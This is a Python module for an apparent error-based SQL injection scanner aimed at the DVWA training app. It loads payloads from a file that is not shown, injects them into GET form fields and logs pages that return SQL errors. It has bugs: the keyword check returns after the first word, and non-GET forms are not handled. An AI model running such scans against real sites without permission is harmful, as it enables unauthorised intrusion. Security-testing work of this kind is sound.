import requests
from datetime import datetime
from bs4 import BeautifulSoup as bs
from Helpers import helper_generic_tags
from Helpers import helper_dvwa
from Attack import base_attack

LOGS_FILE_PATH = "ErrorBased_SQLi_Logs.txt"
PAYLOADS_FILE_PATH = "ErrorBased_SQLi_Payloads.txt"


class SQLi(base_attack.Attack):
    def __init__(self, url):
        super().__init__(url)


    @staticmethod
    def __check_sqli_success(html, sqli_payload) -> tuple:
        words_to_check = ["error", "Error", "You have an error in your SQL syntax", "error in your SQL syntax", "Uncaught mysqli_sql_exception"]

        soup = bs(html.content, "html.parser")
        full_text = soup.get_text()

        for word in words_to_check:
            if word in full_text:
                return True, f"Website is vulnerable to Error based SQL Injection attack!\nInjected payload: <{sqli_payload}>."
            return False, f"The payload <{sqli_payload}> was not injected."

    @staticmethod
    def get_payload_list(file_path: str) -> list:
        with open(file_path, "r") as file:
            sqli_payload_list = file.read().split("\n")
        return sqli_payload_list[:-1]

    @staticmethod
    def save_date_to_file(file_path: str) -> None:
        with open(file_path, "a") as file:
            file.write(f"## Date: {datetime.now().strftime('%d-%m-%Y')} ~ Time: {datetime.now().strftime('%H:%M:%S')} ##\n")
            file.write("-"*50 + "\n")

    @staticmethod
    def save_logs_to_file(file_path: str, result_tuple: tuple) -> None:
        with open(file_path, "a") as file:
            file.write(f"Scan Result: {result_tuple[0]}\nScan Description: {result_tuple[1]}\n")
            file.write("_" * 50 + "\n")

    def scan(self):
        sqli_payload_list = SQLi.get_payload_list("ErrorBased_SQLi_Payloads.txt")

        # Save current date to log file
        SQLi.save_date_to_file("ErrorBased_SQLi_Logs.txt")

        cookies_dict = {
            "security": "low"
        }

        with requests.Session() as sess:
            sess.cookies.update(cookies_dict)

            url_to_check_res = sess.get(self.url)
            print(url_to_check_res.text)

            forms = helper_generic_tags.GetGenericTags.get_tags(url_to_check_res.text, "form", {})

            for form in forms:
                for payload in sqli_payload_list:

                    # For GET request
                    if form["method"] == "GET":
                        input_tags_as_dict = helper_dvwa.DVWA.extract_input_values(form)

                        for key, value in input_tags_as_dict.items():
                            if value is None:
                                input_tags_as_dict[key] = payload

                        response = sess.get(self.url, params=input_tags_as_dict)

                    result_bool, result_description = SQLi.__check_sqli_success(response, payload)
                    res_tup = result_bool, result_description

                    SQLi.save_logs_to_file("ErrorBased_SQLi_Logs.txt", res_tup)


# if __name__ == '__main__':
#     SQLi.main()
